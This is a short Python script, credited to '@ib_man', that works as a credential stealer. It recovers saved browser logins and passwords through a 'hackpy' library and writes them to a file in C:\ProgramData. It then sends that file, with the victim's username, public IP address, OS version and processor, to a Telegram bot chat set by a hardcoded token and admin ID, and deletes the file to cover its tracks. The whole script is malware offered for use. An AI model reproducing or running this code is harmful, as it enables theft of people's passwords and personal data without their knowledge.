# Created by @ib_man

# If you have questions/errors, fast write to me!

from hackpy.passwords import *
import os, requests, telebot, platform

token = '1070231295:AAHCQNcLPMbUvQQMG2Xdw7GZKKHdTBxEhH8'
adm = 1014234455
bot = telebot.TeleBot(token)




f = open(r'C:\ProgramData\system.txt', 'w')

for key, account in passwordsRecovery():
       passw = '['  + str(key) + '] '+'\n| SITE: ' + account['url'] + '\n| USER: ' + account['login'] + '\n| PASS: ' + account['password'] + '\n'
       f.write(passw)
f.close()
filename = r'C:\ProgramData\system.txt'

def send_info():
    username = os.getlogin()
    
    r = requests.get('http://ip.42.pl/raw')
    IP = r.text
    windows = platform.platform()
    processor = platform.processor()
    systemali = platform.version() 
    bot.send_message(adm, "Имя: " + username + "\nIP: " + IP + "\nOS: " + windows +
        "\n Процессор: " + processor + "\nВерсия ОС : " + systemali)

doc = open(r'C:\ProgramData\system.txt', 'rb')
bot.send_document(adm, doc)
doc.close()
send_info()
os.remove(r'C:\ProgramData\system.txt')

